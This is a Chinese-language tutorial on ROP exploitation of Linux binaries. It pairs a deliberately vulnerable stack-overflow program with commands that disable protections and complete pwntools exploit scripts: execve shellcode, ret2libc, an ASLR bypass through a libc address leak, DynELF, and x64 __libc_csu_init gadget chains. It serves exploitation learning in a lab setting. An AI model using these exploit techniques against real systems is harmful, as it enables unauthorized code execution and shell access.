<!-- TOC -->

- [1. 概述](#1-概述)
    - [1.1. 参考资料](#11-参考资料)
    - [1.2. 程序流劫持（Control Flow Hijack）](#12-程序流劫持control-flow-hijack)
    - [1.3. 系统防御](#13-系统防御)
    - [1.4. ROP的概念](#14-rop的概念)
- [2. 准备工作](#2-准备工作)
    - [2.1. 漏洞程序](#21-漏洞程序)
    - [2.2. 设置coredump](#22-设置coredump)
    - [2.3. 解除安全措施的方法](#23-解除安全措施的方法)
    - [2.4. SOCAT](#24-socat)
    - [2.5. 32位库](#25-32位库)
- [3. X86](#3-x86)
- [4. 开启DEP](#4-开启dep)
    - [4.1. ret2libc](#41-ret2libc)
    - [4.2. EXP](#42-exp)
- [5. 开启ASLR+DEP（关闭PIE）](#5-开启aslrdep关闭pie)
    - [5.1. 通过偏移定位](#51-通过偏移定位)
    - [5.2. 获取libc.so中某些函数的内存地址](#52-获取libcso中某些函数的内存地址)
    - [5.3. EXP](#53-exp)
- [6. 无目标服务器so库](#6-无目标服务器so库)
    - [6.1. Memory Leak & DynELF](#61-memory-leak--dynelf)
    - [6.2. EXP](#62-exp)
- [7. x64](#7-x64)
    - [7.1. x64与x86的区别](#71-x64与x86的区别)
- [8. 通用gadgets](#8-通用gadgets)
    - [8.1. __libc_csu_init](#81-__libc_csu_init)
    - [8.2. _dl_runtime_resolve](#82-_dl_runtime_resolve)
    - [8.3. 一个Tips](#83-一个tips)
- [9. 工具](#9-工具)
    - [9.1. gadgets工具](#91-gadgets工具)
        - [9.1.1. ROPgadget](#911-ropgadget)
    - [9.2. pwntools](#92-pwntools)
    - [9.3. EDB](#93-edb)
    - [9.4. objdump](#94-objdump)
- [10. 思路总结](#10-思路总结)
    - [10.1. 利用步骤](#101-利用步骤)
    - [10.2. 方案表](#102-方案表)

<!-- /TOC -->
# 1. 概述
## 1.1. 参考资料
* 蒸米的《一步一步学ROP》系列文章
* 《Linux PWN从入门到熟练》系列文章
## 1.2. 程序流劫持（Control Flow Hijack）
通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。
## 1.3. 系统防御
为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。
## 1.4. ROP的概念
ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。
# 2. 准备工作
## 2.1. 漏洞程序
准备一个经典栈溢出漏洞程序。
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```
## 2.2. 设置coredump
可以防止GDB调试环境下地址与实际运行环境下地址不同的情况。
```bash
# 开启coredump
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
# 调试coredump文件，第一个xxx为可执行文件名，第二个xxx为coredump文件名
gdb xxx /tmp/core.xxx
```
## 2.3. 解除安全措施的方法
* GCC编译选项：`-fno-stack-protector`，用于关闭栈保护
* GCC编译选项：`-z execstack`，用于关闭DEP
* shell指令：`echo 0 > /proc/sys/kernel/randomize_va_space`，用于关闭ASLR，设置为2为启用ASLR
* GCC编译选项：`-no-pie`，用于关闭PIE（程序基址版本的ASLR）
## 2.4. SOCAT
`socat TCP4-LISTEN:10001,fork EXEC:./level1`，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上
## 2.5. 32位库
如果要在64位环境下调试32位程序，需要安装32位相关的库函数：
```bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386
# 如果是比较老的版本，可以用下面的命令
sudo apt-get install ia32-libs
# gcc编译32位程序
gcc -m32 1.c
```
# 3. X86
```python
# encoding:utf-8
from pwn import *
p = process('./level1') 
# 返回地址，通过调试确定栈中地址
ret = 0xbffff290
# 通过自编译生成shellcode，也可以通过msf生成，21字节的shellcode
# shellcode最后的功能相当于execve ("/bin/sh") 
# xor ecx, ecx      ;清零ecx
# mul ecx           ;ecx*eax，清零eax和edx
# push ecx          ;压栈0
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp      ;ebx指向/bin//sh，为参数
# mov al, 11        ;系统调用
# int 0x80
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
# 对ret进行编码，将地址转换成内存中的二进制存储形式；p32(ret) == struct.pack("<I",ret) 
# 这里溢出长度为140，具体可以利用pattern.py来确定溢出长度
payload = shellcode + 'A' * (140 - len(shellcode)) + p32(ret)
p.send(payload)  #发送payload
p.interactive()  #开启交互shell
```
# 4. 开启DEP
## 4.1. ret2libc
通过GDB加载了程序之后，在主函数下断，断下后利用print和find指令找到`system()`函数（`print system`）和`/bin/sh`字符串（可以从`__libc_start_main`函数地址开始找，`find 0xb7e393f0, +2200000, "/bin/sh"`，这里0xb7e393f0是通过print指令确定的`__libc_start_main`函数的 地址，2200000为寻找范围，找到后可以通过`x/s 0xb7f81ff8`来验证）的地址，由于未开启ASLR，该地址不变，然后通过执行`system("/bin/sh")`来获取shell。
## 4.2. EXP
```python
from pwn import *
p = process('./level2')
ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8
payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
p.send(payload)
p.interactive()
```
# 5. 开启ASLR+DEP（关闭PIE）
## 5.1. 通过偏移定位
先获取到libc.so中某些函数的内存地址，然后通过so文件（使用ldd命令可以查看目标程序调用的so库在哪里）和偏移计算出`system`函数和`/bin/sh`字符串在内存中的地址。之后将程序返回到漏洞函数，再次进行溢出，通过`system`函数和`/bin/sh`字符串劫持程序流。
## 5.2. 获取libc.so中某些函数的内存地址
我们可以通过objdump获取到libc.so中某些函数在plt表和got表中的地址，由于程序本身在内存中的地址固定（未启用PIE时），所以plt表和got表的静态地址等于内存地址。可以利用`write`函数把`write`函数在内存中的地址打印出来。
## 5.3. EXP
```python
# encoding:utf-8
from pwn import *
# 读取两个文件
libc = ELF('libc.so')
elf = ELF('level2')
p = process('./level2')
# 获取plt和got地址
plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
# 通过GDB获取漏洞函数地址
vulfun_addr = 0x8049172
print 'vulfun= ' + hex(vulfun_addr)
# 第一次溢出，获取write函数地址
payload1 = 'A' * 140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(got_write) + p32(4)
print "\n###sending payload1 ...###"
p.send(payload1)
print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)
# 计算偏移
print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)
# 第二次溢出，进行程序流劫持
payload2 = 'A'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
print "\n###sending payload2 ...###"
p.send(payload2)
# 开启交互式shell
p.interactive()
```
# 6. 无目标服务器so库
## 6.1. Memory Leak & DynELF
在获取不到目标服务器上的libc.so的情况下，需要通过Memory Leak（内存泄露）来搜索内存寻找`system`函数的地址，pwntools提供了DynELF模块来进行内存搜索（具体实现见EXP）。由于DynELF模块不能够搜索字符串，另外再通过`read`函数将`/bin/sh`字符串写入到程序的.bss段（用于保存全局变量，地址固定，并且可以读可写，通过`readelf -S level2`可以获取到bss段的地址）。在执行完`read`函数之后，接着调用`system("/bin/sh")`。由于`read`函数有三个参数，所以我们需要一个`pop pop pop ret`的gadget用来保证栈平衡（用`objdump -d level2`即可找到）。
## 6.2. EXP
```python
# encoding:utf-8
from pwn import *
# 读取文件
elf = ELF('./level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x8049172
# 泄露函数
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data
# 启动程序
p = process('./level2')
# 获取函数地址
d = DynELF(leak, elf=ELF('./level2'))
system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)
# 另外两个地址，bss段和pop pop pop ret的gadget的地址
bss_addr = 0x804c020
pppr = 0x8049269
payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
# 这里插入一个write函数刷新缓冲区
payload2 += p32(plt_write) + p32(pppr) + p32(1) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")
p.interactive()
```
# 7. x64
## 7.1. x64与x86的区别
* 内存地址范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
* 函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上
# 8. 通用gadgets
因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。默认gcc还会有如下自动编译进去的函数可以用来查找gadgets。
```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```
## 8.1. __libc_csu_init
一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。
```python
# encoding:utf-8
# objdump -d ./level5观察到的__libc_csu_init()
"""
  4011c8:       4c 89 f2                mov    %r14,%rdx
  4011cb:       4c 89 ee                mov    %r13,%rsi
  4011ce:       44 89 e7                mov    %r12d,%edi
  4011d1:       41 ff 14 df             callq  *(%r15,%rbx,8)
  4011d5:       48 83 c3 01             add    $0x1,%rbx
  4011d9:       48 39 dd                cmp    %rbx,%rbp
  4011dc:       75 ea                   jne    4011c8 <__libc_csu_init+0x38>
  4011de:       48 83 c4 08             add    $0x8,%rsp
  4011e2:       5b                      pop    %rbx
  4011e3:       5d                      pop    %rbp
  4011e4:       41 5c                   pop    %r12
  4011e6:       41 5d                   pop    %r13
  4011e8:       41 5e                   pop    %r14
  4011ea:       41 5f                   pop    %r15
  4011ec:       c3                      retq   
"""
from pwn import *
# 打开文件
libc = ELF('libc.so.6')
elf = ELF('level5')
p = process('./level5')
# 获取system函数的地址偏移
got_write = elf.got['write']
got_read = elf.got['read']
main_addr = 0x401153
p.recvuntil("\n")
# 通过漏洞利用打印出write函数的内存地址
# 136填充+返回地址+rbx+rbp+r12(rdi)+r13(rsi)+r14(rdx)+r15+retq
raw_input("")
payload1 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(1) + p64(got_write) + p64(8) + p64(got_write) + p64(0x4011c8)
# 填充栈，返回主函数
payload1 += ("A" * 56 + p64(main_addr))
p.send(payload1)
write_addr = u64(p.recv(8))
print "write address:" + hex(write_addr)
system_addr = write_addr + (libc.symbols["system"] - libc.symbols["write"])
print "system address:" + hex(system_addr)
p.recvuntil("\n")
# 发送第二段payload，写入binsh
bss_addr = 0x0000000000404038
payload2 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(0) + p64(bss_addr) + p64(16) + p64(got_read) + p64(0x4011c8)
# 填充栈，返回主函数
payload2 += ("A" * 56 + p64(main_addr))
p.send(payload2)
p.send(p64(system_addr))
p.send("/bin/sh\0")
p.recvuntil("\n")
# 发送第三段payload，执行
payload3 = "A" * 136 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss_addr+8) + p64(0) + p64(0) + p64(bss_addr) + p64(0x4011c8)
p.send(payload3)
p.interactive()
```
## 8.2. _dl_runtime_resolve
通过这个gadget可以控制六个64位参数寄存器的值，当我们使用参数比较多的函数的时候（比如mmap和mprotect）就可以派上用场了。
## 8.3. 一个Tips
另外，通过控制PC跳转到某些经过稍微偏移过的地址（会改变程序原来的汇编代码）会得到意想不到的效果。
# 9. 工具
## 9.1. gadgets工具
* objdump（可用于寻找简单gadgets）：kali Linux自带
* ROPEME: https://github.com/packz/ropeme
* Ropper: https://github.com/sashs/Ropper
* ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
* rp++: https://github.com/0vercl0k/rp
### 9.1.1. ROPgadget
Kali Linux自带该款工具：
* ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
* ROPgadget --binary libc.so.6 --string '/bin/sh'
## 9.2. pwntools
python库，可以极大的简化pwn的工作量。
* 寻找bin文件中的字符串：next(ELF('libc.so.6').search('/bin/sh'))
* 获取bin文件中函数地址（该地址为展开后函数实际地址，一般用于计算函数偏移）：ELF('libc.so.6').symbols['system']
* 寻找bin文件中plt表和got表中对应函数的地址（plt利用方式为`call/jmp addr_plt`，got利用方式为`call/jmp [addr_got]`）：ELF('libc.so.6').plt['system']；ELF('libc.so.6').got['system']
## 9.3. EDB
EDB调试器，Linux下的GUI调试器，对标OD。
## 9.4. objdump
* 查看可执行文件中的plt表：`objdump -d -j .plt level2`
* 查看可执行文件中的got表：`objdump -R level2`
# 10. 思路总结
## 10.1. 利用步骤
* 检查保护情况：check
* 判断漏洞函数，如gets、scanf、read等（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）
* 计算目标变量的在堆栈中距离ebp的偏移
* 分析是否已经载入了可以利用的函数，如system，execve等
* 分析是否有字符串/bin/sh，如果没有的话可以利用gets、read等函数写入.bss段（注意：gets函数读取输入以换行符结束，read函数则指定了读取长度）
## 10.2. 方案表
|PIE|Canary|DEP|system函数|/bin/sh字符串|gets等写入函数|其它条件|手法|
|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
|No|No|||||程序中存在system('/bin/sh')调用|返回到system('/bin/sh')调用|
|No|No|||存在||程序中存在pop_pop_pop_pop_int的gadgets和/bin/sh字符串|利用gasgets进入系统调用|
|No|No||导入|存在|||返回到system函数，以/bin/sh字符串为参数|
|No|No|||存在|导入|程序中存在pop_ret的gadgets|将/bin/sh字符串写入.bss段，利用pop_ret平衡堆栈，返回到system函数，以/bin/sh字符串为参数|
